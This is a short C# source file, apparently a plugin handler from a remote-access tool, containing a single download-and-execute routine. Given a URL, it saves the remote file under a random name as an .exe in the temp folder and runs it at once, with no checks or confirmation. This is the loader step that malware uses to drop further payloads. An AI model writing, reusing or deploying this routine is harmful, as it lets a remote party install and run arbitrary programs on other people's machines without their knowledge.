using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;

namespace Plugin.Handler
{
    class HandleDownloadFromUrl
    {
        static Random random = new Random();
        public static string chars = "ABCDEFGHIJKLMNOPQRSTUWVXYZ0123456789abcdefghijklmnopqrstuvwxyz";
        public void Start(string url)
        {
            string tmppath;
            using (WebClient client = new WebClient())
            {
                string filename = radomstrs(chars, 8);
                tmppath = Path.Combine(Environment.GetEnvironmentVariable("TMP"), filename + ".exe");
                client.DownloadFile(url, tmppath);
            }
            Process.Start(tmppath);
        }
        public static string radomstrs(string chars, int length)
        {
            string strs = string.Empty;
            for (int i = 0; i < length; i++)
            {
                strs += chars[random.Next(chars.Length)];
            }
            return strs;
        }
    }
}
